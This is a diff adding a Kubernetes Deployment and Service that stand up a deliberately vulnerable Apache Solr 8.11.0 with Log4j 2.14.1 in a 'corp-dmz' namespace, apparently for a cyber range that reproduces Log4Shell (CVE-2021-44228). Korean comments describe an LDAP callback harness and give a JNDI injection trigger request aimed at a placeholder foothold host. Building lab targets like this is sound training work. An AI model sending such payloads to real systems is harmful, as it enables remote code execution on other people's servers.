@@ -1,0 +1,43 @@
+# corp DMZ — Apache Solr 8.11.0 (Log4j 2.14.1 내장) · CVE-2021-44228 Log4Shell
+# VulHub log4j/CVE-2021-44228 재현: Solr 8.11.0 이 Log4j 2.14.1 을 쓴다. 이미지 JDK<8u191 이라
+#   ${jndi:ldap://...} 로 원격 클래스를 바로 로드 → RCE. (Log4j 자체는 라이브러리라 Solr 로 시연.)
+#
+# ※ 콜백 LDAP/클래스 서버는 '공격자 제어'라야 악성 클래스를 서빙한다 → 환경이 제공하지 않는다.
+#   공격 하네스가 corp-ext 발판에서 marshalsec / Java-Chains LDAP+HTTP 를 띄워 섬 내부로 콜백한다
+#   (인터넷 없이 재현). 발판·콜백 도구 배선은 공격 하네스 통합 단계의 몫.
+#   트리거 예시: GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: solr
+  namespace: corp-dmz
+  labels: { app: solr, zone: dmz }
+spec:
+  replicas: 1
+  selector:
+    matchLabels: { app: solr }
+  template:
+    metadata:
+      labels: { app: solr, zone: dmz }
+    spec:
+      containers:
+        - name: solr
+          image: vulhub/solr:8.11.0
+          ports:
+            - { containerPort: 8983 }   # Solr HTTP — Log4Shell 트리거 지점
+          readinessProbe:
+            httpGet: { path: /solr/, port: 8983 }
+            initialDelaySeconds: 30
+            periodSeconds: 10
+            failureThreshold: 12
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: solr
+  namespace: corp-dmz
+  labels: { app: solr }
+spec:
+  selector: { app: solr }
+  ports:
+    - { name: http, port: 8983, targetPort: 8983 }
